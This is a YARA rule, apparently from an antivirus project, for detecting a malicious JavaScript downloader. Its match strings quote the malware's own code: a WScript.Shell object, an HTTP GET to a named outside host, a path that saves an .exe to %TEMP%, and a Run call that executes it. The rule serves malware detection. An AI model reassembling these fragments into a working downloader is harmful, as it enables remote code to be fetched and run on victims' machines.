rule sig_20160328_0639a04c81fee02240d33e08c846dd5b {
  meta:
    description = "datamaliciousorder - file 20160328_0639a04c81fee02240d33e08c846dd5b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "a915cd8b6633f84775b87d43410672d49bafcc6cba6c1a83951b657c59f15298"

  strings:
    $s1  = "function Tsjwbpvgdb() {return Oidyaivwid[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"2MxD4pXcR4W.exe\";};" fullword ascii
    $s2  = "Uvrkkkivj[Bzyjdnp](\"GET\", \"http://www.suansawanresort.com/n7eua\", false);" fullword ascii
    $s3  = "do {WScript[Bybufqns](Wrvgqix() * 11)} while (Uvrkkkivj[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Oidyaivwid = function Vmrqpwa() {return WScript[Tzqnqtpu](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Tnzafbp(Bomlit, Ataidb){return Bomlit - Ataidb;};" fullword ascii
    $s6  = "function Kwepklm() {return ((Rcrshx == true) && (Rcrshx == Tvjpdidsp)) ? 1 : Zjaxebro;};" fullword ascii
    $s7  = "function Cexgs(Dxtagro){Oidyaivwid[\"Run\"](Dxtagro, Zjaxebro, Zjaxebro);};" fullword ascii
    $s8  = "function Rlilptsr(){return Dkdzbsww;};" fullword ascii
    $s9  = "var Tvjpdidsp = false;" fullword ascii
    $s10 = " while (Fbjzhu){" fullword ascii
    $s11 = "Tvjpdidsp = true; " fullword ascii
    $s12 = "var Abpylrni = new this[\"Date\"]();" fullword ascii
    $s13 = "function Vxdviubva(Gscckcnb) {var Lweyb = (1, 2, 3, 4, 5, Gscckcnb); return Lweyb;};" fullword ascii
    $s14 = "var Rlswkq = false;" fullword ascii
    $s15 = "return Tnzafbp(Thynmsa, Oxwizoqc);" fullword ascii
    $s16 = "function Wrvgqix(){return 22;};" fullword ascii
    $s17 = "function Sfwhemktbn()" fullword ascii
    $s18 = "function Ejlhk(){return Tzqnqtpu;};" fullword ascii
    $s19 = "Rcrshx = true; " fullword ascii
    $s20 = "var Rcrshx = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}